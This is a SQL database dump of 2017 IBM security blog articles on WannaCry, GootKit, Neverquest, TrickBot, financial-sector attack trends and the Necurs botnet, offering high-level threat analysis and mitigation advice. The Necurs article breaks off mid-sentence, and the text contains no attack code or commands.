Wcry ransomware. The malware scans the local area network, then starts spraying seemingly random external IP’s with the exploit code. Once it is in, the Wcry ransomware drops and launches a   on the infected machine to anonymize its communications with the attacker’s servers. Ransomware variants such as the  , also known as Critroni, made this trend popular among ransomware operators starting in 2014. Overall, using Tor helps the criminals hide their attack infrastructure and prevent the interception of encryption keys or bitcoin payment confirmations that the victim’s endpoint would send. The malware fetches and drops a number of different executable files on the infected endpoint. Each of those carries out a different function. The essential part is the encryption of the victim’s data, which is carried out by a file called tasksche.exe. The encryption encompasses 160 different file extensions to make sure that all the data is hijacked. WCry will encrypt files with the .wcry/.wncry extension. To make sure that the user can’t access previous copies, the malware deletes all shadow copies from the endpoint by using WMIC.exe, vssadmin.exe and cmd.exe. This action is considered  . Unlike most ransomware that uses an image to display the ransom note to the infected users, Wcry uses an executable file. That file is not the malware; it is a simple program that displays the note to the victim. The image displayed to each victim depends on the IP address mapping to the country he or she is located in. The malware’s authors have adapted numerous different language formats to Wcry; those are often reported as machine translated and rather clunky in terms of syntax. To make sure the victim sees the ransom note immediately, it places it as the foremost window on the desktop by using SetForegroundWindow(). In some of the instances, X-Force researchers noticed that the malware included a tool that changes the victim’s desktop wallpaper with instructions on how to find the decrypting tool dropped by the malware. \n So far, Wcry is known to have hit hospitals, rail systems, telecommunications and courier services, but many other organizations and individuals have been hit as well. On the victims’ side, the outbreak has hit critical infrastructure in some countries such as   and Russia. In the U.K., the health care sector   that goes way beyond disabling hospitals. Hospitals in the country had to turn away patients, reroute ambulances, paralyze emergency services, and reschedule surgeries and appointments, which will all take a toll on operations for some time. With the number of affected systems, incident response and remediation are unlikely to be complete for a while. According to reports, the   of Wcry is most prevalent in Russia at this time. Other constituents on the list of the top 10 most targeted geographies include Ukraine and India, countries where it could be more common to find older, unpatched versions of Windows in use. The Europol indicated that the attacks are of  . At the time of this writing,   in over than 100 countries were already compromised. If over 130,000 endpoints have been infected, and assuming that victims chose to pay up to $300 to unlock each device, the total ransom would amount to over $39 million. Keep in mind that this is the conservative case; Wcry ransom demands may start at $300, but they increase to $400 after two hours, then $500, and, finally $600, per endpoint. The Wcry ransom note contains a compassionate message towards those who can’t afford to pay up. The malware’s operators claim they would unlock the files for free — but only after a six-month period. At the time of this writing, bitcoins are trickling in to the attackers’ wallets, showing about 19 BTC, or about $34,000 dollars accumulating, but remaining untouched. Law enforcement agencies are likely closely watching the wallets and their trails to find a potential link to their criminal owners.  observed new payments keeping trickling into the bitcoin wallet payments associated with Wcry samples. It is important to note that paying the criminals funds these types of attacks, and the FBI   victims from paying up. At this time, many Windows servers and workstations are still potentially vulnerable, which means that Wcry may still have ground to cover in the coming week. To mitigate the threat, organizations should ensure that the relevant patches are urgently deployed across their entire infrastructure where the Windows OS is used. Microsoft has issued an emergency patch that can be  . In addition, security professionals should block Server Message Block (SMB) ports, particularly ports 139 and 445 from external hosts, along with User Datagram Protocol (UDP) ports 137 and 138, from the local network to the wide area network (WANO). Verify that outbound connections to TCP ports 139 and 445 are prohibited by running the following commands from any server with Netcat installed: For further control, consider disabling SMBv1 and SMBv2 and only permitting SMBv3 connections by policy on clients. Wcry is spreading at an alarming rate, and while it was   by the accidental discovery of a kill switch, that part of its code has already been removed. The kill switch was based on the ransomware contacting a hardcoded domain before installing on the endpoint. That domain was not registered by the criminal, and was therefore snatched by a security researcher who found it, effectively turning it into a sinkhole. Consider enabling access to the sinkhole domain from your corporate endpoints. It is possible that employees who got infected over the weekend will carry in those older samples on Monday morning, and if the domain is reachable, the malware will not activate on those endpoints. The domain name is: www[.]iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com Remember that the criminals behind these attacks have  , and not all samples contained it from the get-go. Make sure your environment is   and expect Wcry this week. Another point about the kill switch: The domain call only works in systems that are directly connected to the internet. Hence, if the endpoint proxies its traffic, the kill switch won’t work and the ransomware will run. This could mean that the attacker’s idea was to hit corporate networks where endpoint traffic is usually proxied, and halt on those that are most likely consumer devices. You should seek more ample advice from your security vendor. IBM Security customers can turn to their contacts for mitigation instructions and   requirements. The ransomware threat is neither new nor novel. It is a type of malicious software that infiltrates an endpoint with the purpose of encrypting all the files on it, and then demanding a ransom payment to release them back to the rightful owner. The threat traces back to 1989, when it first emerged on floppy disks sent to unsuspecting computer owners. It has gained disproportionate momentum since 2014, along with the rise of cryptocurrencies used across the globe, which enable cybercriminals to anonymously demand payment from anyone. Ransomware was the   in 2016, with over 40,000 attacks per day at times, and reaching well over   that carry malicious payloads. IBM X-Force researchers tracking spam trends noted that the rise in ransomware spam in 2016 reached an exorbitant 6,000 percent, going from 0.6 percent of spam emails in 2015 to an average of 40 percent of email spam in 2016. The situation is only worsening in 2017. The   and   have issued alerts about this threat. The FBI estimated that ransomware is on pace to become a   for cybercriminals by the end of 2016, a number that is expected to continue to rise in 2017. For information on using your IBM products to defend your infrastructure from the Wcry threat, please browse to our   on X-Force Exchange. We also invite you to watch the on-demand webinar series, “ .”', '\'Advanced Malware\', \'Bitcoin\', \'IBM X-Force Research\', \'Malware\', \'Ransomware\', \'WannaCry\', \'X-Force\'', 'https://securityintelligence.com/wannacry-ransomware-spreads-across-the-globe-makes-organizations-wanna-cry-about-microsoft-vulnerability/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (109, 'GootKit Launches Redirection Attacks in the UK', 'Limor Kessem', '2017-5-11', 'While going over some recent  , I came across an unfamiliar URL format that includes two URLs instead of one. It only takes a fraction of a second to understand: GootKit has launched   — a more advanced way to manipulate online banking sessions than the typical webinjection attacks its operators had used up until now. Much like some of its counterparts in other organized cybercrime gangs — namely, Dridex, GozNym and TrickBot — GootKit joins the ranks of malware that hijacks infected victims to a fake website to trick them into a simulated online banking session. Only this one is completely fraudulent. GootKit’s first targets in this new redirection scheme were the business banking web applications of four major banks in the U.K. Some coincidence it is that most of these gangs kick off redirection attacks in the U.K. When this modus operandi first surfaced with   in 2014, it was launched in the U.K. The same geography was the launch zone when Dridex first used redirection attacks. The latest addition to that bunch was  , whose operators also selected the U.K. as the first destination for the redirection attacks they devised. The only other Trojan that uses redirection attacks is GozNym. In this case, it was an exception, since it launched redirection attacks  . Unsurprisingly, all of the above are believed to be operated by organized cybercrime gangs focused on targeting  , which is an umbrella term for anything from corporate banking to treasury, wealth management and investment banking accounts. \n When it comes to online banking fraud, most Trojans use webinjection attacks to control and modify what infected users can see on their screens when they access their online banking accounts. Injections enable criminals to socially engineer victims in real time to gain access to their bank accounts or influence them to unknowingly approve a fraudulent transaction. To start working at the right time, cybercriminals trigger the injections into action as soon as a victim browses to a specific URL. Webinjections have been in widespread use by cybercriminals for well over a decade. They have their strong suits, but they also have weaknesses, like being written directly into the malware’s configuration file, which typically receives attention from   who eventually unveil them. Fitting with the age-old cat-and-mouse metaphor, redirection attacks are indicative of cybercriminals migrating to a more elaborate manipulation scheme. More than just adding target URLs to the configuration or injecting the bank’s page with foreign malicious content, redirection is considered an advanced method to manipulate what victims see on their browsers. This too is triggered by access to a specific URL the criminal predetermines, but instead of injecting the page, the actor hijacks the victim to an entirely different page hosted directly on rogue servers. The page victims are seeing at that point was prepared in advance to look exactly like their bank’s login page. In the background, the criminals keep a live connection to the bank’s legitimate site to present trust-building elements on their fake page. They present users with the correct URL and even the genuine Transport Layer Security (TLS) certificate. Victims can’t tell they are on a fake site and may be lured into logging in. If the login is successful, the attack continues. In most cases, the next stage is made up of webinjections. Only this time, they are not written into the malware’s configuration file but pulled from the rogue server in real time, concealed from any prying eyes. This crafty M.O. is used to bypass bank security measures by hijacking victims to a malicious website before they ever reach the bank’s site. By keeping victims away from the legitimate site, fraudsters can deceive them into divulging critical authentication elements on the replica site without the bank knowing or discovering the flow of events on the fake site. Redirection attacks are most often identified with the resources and capabilities of organized cybergangs with in-house developers because of the extra setup required to maintain unique site replicas for each target. This is the first time I’ve seen GootKit using a redirection scheme. The malware’s redirection M.O. is similar to Dridex. IBM X-Force researchers are watching out for an expansion of GootKit redirection schemes to other brands and geographies; the malware is known to operate in the U.K., France, Spain and Italy. Discovered in the summer of 2014, GootKit is generally considered one of the more advanced banking Trojans active in the wild. This crimeware is an ongoing project that implements advanced stealth and persistence features alongside real-time, web-based activities such as dynamic webinjections and, now, redirection attacks. X-Force researchers detected and analyzed an upgraded   in February 2017 and revealed details about the malware’s setup of a web traffic proxy on victims’ endpoints. IBM Haifa Labs released a paper providing a   of GootKit’s stealth mechanisms in March 2017. This X-Force research led us to suspect that GootKit is developed and operated by a small, Russian-speaking cybergang who keeps the code private. The group typically launches limited-sized campaigns in a small number of European countries. In recent infection campaigns delivering GootKit as a payload, the malware was associated with the RIG exploit kit and   known as the EITest campaign. GootKit’s overall prevalence in the wild is rather limited compared to other malware of its class. This is due to its operators keeping campaigns focused on a small number of countries. This post was written after analysis of a   with MD5 hash: ddf408ce7c4b5df1a57a3ca45197f18e.', '\'Banking Trojan\', \'GootKit\', \'IBM X-Force Research\', \'Malware\', \'Trojan\', \'United Kingdom\', \'X-Force\'', 'https://securityintelligence.com/gootkit-launches-redirection-attacks-in-the-uk/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (110, 'Neverquest Gang Takes Leave — Is It the End of the Quest?', 'Limor Kessem', '2017-5-4', 'I’ll bet no one is missing the Neverquest Trojan, and maybe that’s why many have not even realized one of the top cybergang-operated malware codes has taken a substantial plunge this year. The Neverquest Trojan, a consistent occupant of the   in the world, has suffered a blow due to the arrest of one of its alleged authors in January 2017. The 32-year-old Russian national, Stanislav Lisov,   in Barcelona based on an FBI warrant that asserted he was the developer of the nefarious Neverquest malware. While an arrest is indeed a major ordeal for any cybercrime gang, others, such as  , went through the same occurrence and continue to top the charts. So, what’s been happening with the Neverquest gang? Looking back at where Neverquest has been the past two years clarifies the size of the usage plunge since Lisov’s pivotal arrest. IBM X-Force data shows that in 2015, Neverquest was second only to the Dyre Trojan, which topped the financial malware charts that year. In 2016, after  , Neverquest took its place as the most active banking Trojan in the cybercrime arena. X-Force data showed that it was only in late 2016 that new Zeus variations started rising in underground forums and pushed Neverquest down to second rank. \n Neverquest started 2017 strong on the malware chart. X-Force data from the beginning of the year shows it still ranked second on the top 10 list, only following the endless number of Zeus factions operating commercial malware. \n During the first quarter of 2017, Neverquest’s activity — and subsequently its ranking — on the global banking Trojan charts, dropped rapidly. By the end of the first quarter, it ended up in 10th place, right under the much less prevalent  . \n To understand why this arrest impacted Neverquest so much, let’s consider its modus operandi and the cybergang’s composition for committing fraud. The Neverquest Trojan, aka Vawtrak, is a Gozi Trojan variation that was discovered by IBM Security researchers in  . It surfaced at a time when other would-be giants such as Dridex and Dyre emerged. Neverquest’s roots go back to 2000, linking it with organized cybercrime groups such as  , which were Russian Business Network (RBN) partners. This classification means rookies did not conceive or operate the malware, but it was the work of seasoned cybercriminals who had plans to build a cybercrime-as-a-service platform around it. Having analyzed Neverquest target lists over time, it’s logical to infer that Neverquest, like its peers, had a clear appetite for big money: business banking and investment banking. By 2015, the Trojan’s configuration files started featuring a growing number of bank URLs, targeting those services right around the time the   were discovered, and unveiled the exact approach organized cybercrime was using to cash in on those targets. According to X-Force researchers, Neverquest is believed to be a cybercrime-as-a-service platform that supported a number of geo-specific operators who used the malware and botnet to rob bank accounts and share the loot with operators. Similar to the way the Dridex botnet is divided into numbered campaigns and sub-botnets, Neverquest is also programmed to create this distinction: As soon as it lands on a newly infected endpoint, it calls home with a numeric ID that identifies its campaign. In that way, the botnet is segmented into the different campaigns, allowing its operator to attribute specific configuration instructions to each segment, including the attack M.O., webinjections and more. This method was apparently conceptualized by the Gameover Zeus gang, according to an organized cybercrime  . This explains why some Neverquest configurations are long and include a large variety of targets, blocked URLs and different attack modes: They are designed to accommodate a number of actors at once, making them heftier than most. What does Neverquest’s business model have to do with the 2017 plunge in activity? A lot actually, and it’s a human reaction called fear. Neverquest, unlike the GootKit gang for example, is not one close-knit gang; it’s a service to the cybercrime elite. The minute Neverquest’s dubious collaborators saw law enforcement reach one of their trusted parties, they realized the FBI was already too close for comfort and dropped it like it was hot: Campaigns delivering the Neverquest Trojan dropped considerably on Jan. 19, 2017, just a few days after   in Spain. \n Is Neverquest gone, or just taking a hiatus of sorts? I wouldn’t be too fast to pronounce Neverquest dead. This malware is linked with   that date back to the year 2000. The original Ursnif became Gozi, which evolved into Gozi Prinimalka, which eventually became Neverquest. It has been operated by seasoned criminals through the years, and the code is probably still in one of its proponent’s possession. It is very possible that the Neverquest group is shifting from using that particular malware to evade the attention from law enforcement, but nothing has stopped them from going back to activating it, selling it to another group or modifying it before a future relaunch. Time will tell. In the meanwhile, keep an eye out on the Sphinx Trojan, which has been rising rapidly and is likely to climb the global chart some more before 2017 is over. Wait, what? Why Zeus Sphinx? Cybercriminals moving from one gang to another is not a rare occurrence. Take, for example, the Dridex Trojan that suddenly donned Dyre-like redirection attacks in  , or the   that emerged with all the bells and whistles of the late Dyre Trojan. These were unlikely coincidences, and likely the case of the now-scrammed Neverquest users. The end of a quest, possibly, but where are Neverquest operators headed next? It’s not so hard to figure out. Let’s note here that Neverquest, like other malware of its type, outsources its distribution in part or in whole. For most of its email spam delivery, X-Force research noted that it was using a network known as the   Network — spam delivery serving cybercriminals and others. Delivery via Moskalvzapoe was halted for about a week, from Jan. 19 to Jan. 24, but after that first week, it appears that Moskalvzapoe’s operators took their customer back — this time abandoning Neverquest for the Zeus Sphinx Trojan and dropping it via Moskalvzapoe’s  . The group is likely using Sphinx  . How surprising is it to see this Zeus variation take a life of its own and begin climbing the malware charts this year? \n  can help banks that wish to learn more about this threat, and assist them in securing their users against Trojan-facilitated cybercrime. Users wishing to get a few best practices on lowering their risk of infection from banking Trojans can browse to our   for more information. \n The following are Neverquest samples analyzed by IBM X-Force research in January 2017, before the drop in campaigns began: 2DEC5EDC4D1F59D10E3925EB2D7BFE7D 3AAB483EBD107C6E6E44AAD524E40EC0 C3D36F11D65851242B6EDDAA835FC72B', '\'Advanced Malware\', \'Banking Trojan\', \'Dridex\', \'Dyre\', \'Gozi\', \'IBM X-Force Research\', \'Malware\', \'Neverquest\', \'Sphinx\', \'Threat Intelligence\', \'Trojan\', \'X-Force\'', 'https://securityintelligence.com/neverquest-gang-takes-leave-is-it-the-end-of-the-quest/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (111, 'Know Your Apps: Explore the IBM Security App Exchange Ecosystem for Collaborative Defense', 'Sandeep Mukherjee', '2017-5-3', 'Collaboration, integration and teamwork are jargon you might hear daily in your professional life. We strive to collaborate with our colleagues, family and friends to achieve our personal goals and share expertise. In 2015, IBM Security took this collaborative approach to the next level by launching the  , a marketplace for the security community, and inviting all partners and clients to create and share apps based on the company’s security technologies. This ecosystem of apps enabled IBM and partners to collaborate to develop a stronger defense against the threats affecting the security market. \n Since its inception, the IBM Security App Exchange has introduced several significant apps that are being leveraged by market players to strengthen their security defense with collaboration. The ecosystem already has around 100 apps, including IBM and partner apps, and the numbers are increasing. In our client meetings, numerous testimonials have been shared regarding how the App Exchange is vital for a  , and clients are eager to know what’s cooking. We heard you, and now we invite you to join us for a new webinar series in which IBM experts will introduce new and exciting apps. Below are sessions we have planned for May and June. On May 17, Milan Patel, program director for security offerings management, and Stephen C. Will, threat intelligence engineer, will present a demo of an insider threat detected by the   and investigated with Watson for Cyber Security. In this webinar, you will learn: On May 31, you will learn from I-Lung Kao, BigFix product manager, and George Mina, program director for Watson for Cyber Security, endpoint and mobile security. They’ll discuss the new IBM BigFix App for QRadar, which can bring together powerful sources of information, including security events collected and analyzed by QRadar, endpoint activity and endpoint security posture, such as the vulnerability/patch status and antivirus deployment health measured and managed by the BigFix platform. With this broad visibility into both activity and security posture, direct connections can be made between a detected attack and endpoint exposure, providing clarity into exactly what   should be taken. In this webinar, you will learn: Finally, on June 13, Shane Lundy, program director of security offerings management, will talk about how analysts in a security operations center (SOC) can take advantage of apps to optimize their current security products and speed up reaction times. In this webinar, you will learn: We are eager to share the latest IBM apps with you so that you can start using them to build a strong defense strategy with collaboration. Register for one or more of these webinars   and visit the   to familiarize yourself with all the offerings.', '\'Application Development\', \'Applications\', \'Collaboration\', \'IBM\', \'IBM Security\', \'IBM Security App Exchange\', \'Threat Intelligence\'', 'https://securityintelligence.com/know-your-apps-explore-the-ibm-security-app-exchange-ecosystem-for-collaborative-defense/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (112, 'TrickBot Is Hand-Picking Private Banks for Targets — With Redirection Attacks in Tow!', 'Limor Kessem', '2017-4-27', 'IBM X-Force research follows organized cybercrime and continually monitors the criminals’ targets and modus operandi. In a recent analysis of TrickBot campaigns in the U.K., Australia and Germany, I found that the operators of the infamous Trojan have been adding new redirection attacks focused on a list of brands that I had never seen in the past. Curious about this addition to the TrickBot prime target roster, I went on to examine each URL, only to find out that the operators have been doing a lot of homework. The current configuration files are replete with private banks, private wealth management firms, investment banking, and even a retirement insurance and annuity company. One of the new targets is among the oldest banks in the world, located in the U.K. \n TrickBot is sharpening its focus on business banking, too, adding some rare finds to its more usual hit list. A Sharia law-compliant bank, for example, is among the new brands targeted, which is interesting because banking activity consistent with the principles of Sharia law prohibits certain exchanges such as interest fees and investment in business types unacceptable in Islam. I have not seen this bank listed as a mark in the past eight years of analyzing malware targets. Looking at the configuration, in the U.K., TrickBot has added 20 new private banking brands to its regular attack roster, as well as eight building societies. Also added were two Swiss banks, a few regular expressions for private banking platforms in Germany and four investment banking firms in the U.S. The complete set of targets includes over 300 unique URLs and regular expressions. \n In recent weeks, IBM X-Force has been detecting ramped-up   in Australia, New Zealand and the U.K., the operators’ primary target geographies at this time. The malware has grown from one to three major campaigns per month to five campaigns already in April. It is possible that TrickBot’s operators are increasing their spam runs in the target geographies and attempting to infect more endpoints before going into an attack phase next. \n In terms of its attack types, TrickBot is quite similar to Dyre. Its signature moves are browser manipulation techniques that enable the malware to implement serverside webinjections and redirection attacks. More details about those techniques appear in our   on TrickBot. In my December 2016  , I noted that this malware was one to watch in 2017, and this cybergang is certainly living up to that prediction. The expanded target list, as well as the focus on new brands and high-value account types, means that this nefarious group is setting its sail and likely plans to deploy its crimeware in new territory. The TrickBot malware emerged in the   and featured some striking resemblances to the Dyre Trojan right off the bat. Within no more than a month of attack activity, TrickBot was fully equipped with redirection attacks that hit banks in three distinct geographical and linguistic zones: the U.K., Germany and  . It then moved on to attacking banks in  , Australia and New Zealand, the latter two of which were prominent Dyre targets. As the year progresses, I expect to see TrickBot climb up the global chart of financial malware families, reaching a similar magnitude as the Dridex Trojan and possibly outnumbering Dridex attacks by year’s end. \n Please note that prior to publishing this blog, IBM X-Force notified the concerned parties and provided them with indicators of compromise (IoCs), and information about TrickBot and its attack methods.  is available publicly on X-Force Exchange. We studied the following current TrickBot samples for this blog: Banks looking for technological solutions to mitigate threats such as malware attacks and redirection schemes are invited to learn more about the  . To learn more about mitigating threats such as the TrickBot Trojan, users can visit our post for   to apply in everyday browsing.', '\'Banking Malware\', \'Banking Trojan\', \'Dyre\', \'Financial Fraud\', \'Financial Malware\', \'IBM X-Force Exchange\', \'IBM X-Force Research\', \'Malware\', \'TrickBot\', \'X-Force\'', 'https://securityintelligence.com/trickbot-is-hand-picking-private-banks-for-targets-with-redirection-attacks-in-tow/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (113, 'A Magnet for Cybercrime: Financial Services Sector', 'Michelle Alvarez', '2017-4-27', 'As revealed in the  , the financial services sector was attacked more than any other industry last year. The average financial services client organization monitored by IBM Security Services experienced 65 percent more attacks than the average client organization across all industries (see Figure 1). Moreover, 2016 saw, on average, a 29 percent increase in attacks against financial services organizations, up from 1,310 attacks in   to 1,684 in 2016. \n A   by IBM Managed Security Services (MSS) threat researchers took a closer look at the financial services industry’s cybercrime woes. There was no shortage of cyberattack-induced financial ruin in 2016. Outages due to distributed denial-of-service (DDoS) shut down online financial institutions’ operations all over the globe. Malware, including ransomware, was responsible for millions in losses. And with over 200 million records compromised in 2016 — a 937 percent increase over 2015 — the financial services sector ranked third among other industries in terms of  . Where were the attacks emanating from in 2016? According to IBM MSS analysis of monitored financial services client data, organizations were more affected by insider than outsider attacks (58 percent versus 42 percent). Within the insider group, many more inadvertent actors (53 percent) unwittingly caused harm than   (5 percent) acting against the organization. Companies in 2016’s most attacked sector must work harder to stay ahead of cybercrime. Fortunately, financial services organizations can strengthen their   by focusing on mitigating notable security pain points such as insider threats and financial malware.', '\'Cybercrime\', \'Financial Industry\', \'Financial Malware\', \'IBM X-Force Report\', \'IBM X-Force Research\', \'Ransomware\', \'X-Force\'', 'https://securityintelligence.com/a-magnet-for-cybercrime-financial-services-sector/');
INSERT INTO `securityintelligence` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (114, 'The Necurs Botnet: A Pandora’s Box of Malicious Spam', 'Limor Kessem', '2017-4-24', 'This is the tale of a cybercrime botnet operation that, within about five years of its existence, has been named one of the largest botnets in the world. It’s called the Necurs botnet. It militarizes   zombie endpoints, delivers some of the worst banking Trojans and ransomware threats in batches of millions of emails at a time, and it keeps reinventing itself. The bottom line is that Necurs is indirectly responsible for a major chunk of cybercrime and the losses it produces. According to reports, cybercrime damages are expected to cost the world   by 2021. This magnitude alone makes it worthwhile to get to know more about one the top players in that nefarious game. \n Cybercrime history has had its share of malicious botnets and evil infrastructure in the past two decades, including Grum,   and  . But while most past cases were single-flavored in terms of their lifetime vocation, one resilient and active example definitely stands out: the multipurpose Necurs botnet. Necurs emerged in 2012 as an infector and rootkit, and quickly partnered with elite cybercrime gangs to become part of the top spamming and infection forces in the malware realm. Unlike most botnets, Necurs stands out due to its technical complexity, partnership diversity and continued evolution in an era when even the most complex   can no longer withstand disruption. In the past year alone, we have seen Necurs take on various roles. Linked with the spam distribution of the Dridex gang, it is used to spread one of the world’s most nefarious banking Trojans. It also moved to mass distributing Locky, Dridex’s ransomware child, then added distributed denial-of-service (DDoS) attacks. Most recently, Necurs moved to pump-and-dump stock scam distribution before returning to spreading millions of Dridex-laden   a day. This article will take you through the history of Necurs, a botnet dubbed “one of the   spam botnets.” It will take you down the rabbit hole of its evil partnerships with the most infamous cybercrime gangs, including Necurs’ varying current activity, which was   with a couple of peculiar surprises. The Necurs botnet emerged in late 2012 and launched with a bang when it was reportedly detected in over 83,000 infections on endpoints all over the world. Necurs never had a humble beginning. Right from the start, it was clear that its operators were not only well-versed in operational security, but they were also well-connected in to the cybercrime elite in Eastern Europe, revealing the level of their customers to this very day. Upon its emergence, Necurs’ operators started using a Dot-Bit domain to create a peer-to-peer network that would allow them to evade detection in quite an interesting manner. The bit top-level domain (TLD) was created outside the domain name system, which means it is not controlled by the Internet Corporation for Assigned Names and Numbers (ICANN). This resulted in a   in which the TLD is not owned by any single entity and DNS lookup tables are shared only on a peer-to-peer basis. This means that DNS servers can be neither updated nor seized by any authority, and once a domain is registered, only its owner can control it. Access to the Dot-Bit domains was limited to those using a very particular proxy setting, which Necurs had configured  . This uncommon workaround is clever, but more than that, it was rather telling of what’s to come. By 2013, Necurs went into second gear and started leveraging the Upatre loader to make way for itself and delivering the   (aka Zeus P2P) malware to compromised endpoints. It is a known fact that Gameover Zeus was a malware variant   by none other than   and his cybercrime gang. This suggests that the Necurs operators were linked to the very centrum of the banking malware elite in the early days. In 2014, Necurs continued to bolster Gameover Zeus’ resilience on infected endpoints, this time as an exploit-laden  , one of the most invasive and persistent holds malware can have on a Windows PC. Malicious emails or malvertising campaigns carrying Upatre would download Gameover Zeus into a compromised PC. This time, Gameover Zeus was the one to run Necurs. Necurs’ rootkit features made it nearly impossible to remove Gameover Zeus from the infected PC. Unsurprisingly, by the time   the Gameover Zeus botnet in late 2014, it had already grown its secondary income source: CryptoLocker ransomware. CryptoLocker was one of the most infamous ransomware codes at the time, and a cybercrime business that reaped an estimated   in illicit profits within a mere 100 days. It was   alongside Gameover Zeus and has not returned since. As you can see, Necurs always kept very bad company. Pretty much the worst. Following the booming ransomware trend that picked up speed in 2015, Necurs continued to distribute crypto-ransomware Trojans that year, sometimes through well-known exploits kits such as Magnitude and Angler. One of its favorites was apparently  , the successor to CryptoLocker. Necurs’ operators continued to reap the rewards of associating themselves with cybercrime lords; CryptoWall’s operators stole   from infected victims in the first half of 2015, most of which were located in the U.S. By 2016, Necurs turned a new page in its operations. It started using its million-strong botnet as a spamming infrastructure and launched a partnership, by no means lesser than its previous one, with the Dridex malware gang. Dridex is a sophisticated modular banking Trojan project based the original   Trojan’s source code. Dridex first emerged in June 2014 and rapidly evolved into one of the   in the financial sector. It targets banks in over 30 countries across the globe, focusing on businesses and robbing its victims of  . Dridex’s owners are believed to be an organized cybercrime gang that calls itself Evil Corp, thought to have spun off from the  , another Eastern European organized cybercrime gang. The Business Club was accused of stealing more than $100 million from banks and companies worldwide. Evil Corp is infamous for defrauding corporate banking customers, nefarious tactics dubbed  . Using Dridex as its tool, the gang mixes its advanced technical capabilities, such as   and hidden VNC remote control modules, with social engineering and advanced persistent threat (APT)-style planning. Its most recent   exemplified its operators’ skill level and sophistication grade, and its potential   in 2016 offers a hint as to the circles it moves in. Necurs’ Dridex spam service resulted in some hefty spam campaigns in 2016, alongside some spam for other gangs such as  , TeslaCrypt ransomware, Neverquest and others. It was at that time that it also started distributing a new ransomware variant: Locky. Due to its in-tandem campaigns originating from Dridex-spewing sources, Locky was   and to the  . In an up-and-down style that’s rather   malware, Necurs campaigns came to a halt starting in late May 2016 due to a possible glitch in the botnet’s infrastructure. Researchers operating a Necurs   noted that after a sudden 24-hour outage of its command-and-control server (C&C), nearly 1.1 million Necurs-infected hosts attempted to connect to the sinkhole in search of a new C&C, revealing the botnet’s true magnitude. Following that outage, Necurs’ spam volumes, which   at hundreds of millions of messages, dropped drastically, and with it dropped spam volumes  . But it did not take Necurs long to recoup. By late June 2016, it was  , delivering hordes of Locky- and Dridex-laden spam emails to unsuspecting user inboxes. The activity was   throughout summer of 2016, and then came to yet   in December 2016. And so the Necurs botnet went into yet another unexplained lull after the holiday season, when it is quite customary for cybercriminals to slow down. Many expected Necurs to return in January, but things remained pretty quiet, with limited campaign volumes all the way until late February 2017.   roughly 50,000 IPs related to spam attacks in their blacklists during this time, as opposed to approximately 350,000 to 400,000 while Necurs was active. \n \n In February 2017, the Necurs botnet started rearing its more familiar ugly head once again, coming back with new tricks up its sleeve. This time, Necurs made the rounds, serving itself with a side of   that was added to it back in September 2016. For size, with over 1 million active bots at any given time, a DDoS attack leveraging the Necurs botnet could far exceed the volume and effect of attacks the size of recent   onslaughts. Next up, Necurs diversified its portfolio, and in March 2017, it swamped masses of email boxes with pump-and-dump stock scams — quite a   considering its malware-ridden past. IBM X-Force researchers started seeing a   on March 20, 2017. At that point, the botnet was sending at least seven different versions of an email crafted to entice investors to buy shares of a little-known media holding company in the U.S. This new trend for Necurs was somewhat surprising, since penny stock scams are considered rather outdated. Yet it appears that   in pumping its unwitting target’s stock value, which may have enabled its operator to reap the illicit rewards. It likely worked well enough, because Necurs was   a week later with yet another target. This time, a small firm that develops marketing channels to distribute third-party fitness equipment to wholesale markets in the U.S. was the subject of Necurs’ affection. Necurs’ botnet succeeded yet again, pumping the stock price high enough to yield a profit to those who stand behind it. In the wake of the ongoing penny stock scams that flowed out of Necurs bots in March, the botnet’s operators also   one of their most infamous customers: the Dridex Trojan. Dridex’s developers were hard at work during the first quarter of 2017,   the malware’s capabilities. But they also got ready for something bigger: a  . It’s no coincidence that they then launched into a multimillion-message spam campaign, delivering Dridex via an  . On the side, Necurs has been delivering Kegotip via the Upatre loader for at least a year now. This is merely a low-grade information stealer with a pretty nefarious loader, right? But one of Kegotip’s main functions is scraping email addresses from hard drives of endpoints it infects, even crossing to additional partitions on the endpoint. This generates quite a handsome bounty for its operators, likely in the form of the Necurs botnet itself, which then uses these addresses in its spam runs. Kegotip has been   Dridex and Locky infections since April 2016, either via the RockLoader or Upatre. While Necus is focused on spreading itself over its newfound endeavors, Locky spam slipped down and let the   ransomware   as the most prevalent ransomware pest in the cybercrime arena in the first quarter of 2017. April 2017 campaigns originating from Necurs are apparently spreading  , advertising a website that specializes in Russian dating prospects for Western men. According to data from X-Force research, Necurs blasted out 7,087,535 emails using one of the formats of this spam in just one day in April. \n \n Why would Necurs, which was purely a malware botnet serving the most sophisticated malcode and being linked with exploit kit operations, suddenly start sending the lower end spam? The mastermind behind one of the largest spam botnets, Kelihos, was   by the U.S. Justice Department in Barcelona, Spain. Now that this Russian national, who is considered “one of the world’s most notorious criminal spammers,” is  , Necurs might be filling in for the Kelihos botnet, spamming for junk mail customers in its stead. What allows Necurs to remain a large and resilient botnet over time? It has already been   “the world’s largest spam botnet,” and it continues to thrive in a   and law enforcement pursuit. Let’s look at the factors that contribute to its strength. The most significant point about Necurs is that, unlike common botnet malware such as Kelihos, Necurs has kernel-mode   capabilities. It is composed of a   and a user-mode component. Kernel-mode rootkits are malicious applications that run in the kernel of the OS with absolute rights to system resources, including both software and hardware, which grants them the deepest privilege level, right in Ring 0. Programming kernel-mode rootkits is considered an advanced skill, and any error in code can cause the kernel to crash, thus disabling the entire operating system. This is why very few malware codes possess this capability, and few ever did. For Necurs, it means that once it is on a newly infected endpoint, it is unlikely to get detected by antivirus applications, which run in Ring 3 (user mode). It will also be very hard, if not impossible to remove. Another notable point about Necurs is its modular architecture. Typical botnet malware that’s only designed to amass bots for other purposes, spread spam or download other malware is relatively simple in technical terms. That is not the case with Necurs. The latter is built in the same way that the most sophisticated Trojans are built, in a modular fashion that allows it to take on different new features as its developers see fit. Necurs’ modularity is what allows it to switch things up when its operators choose to change its vocation, partner with other malware 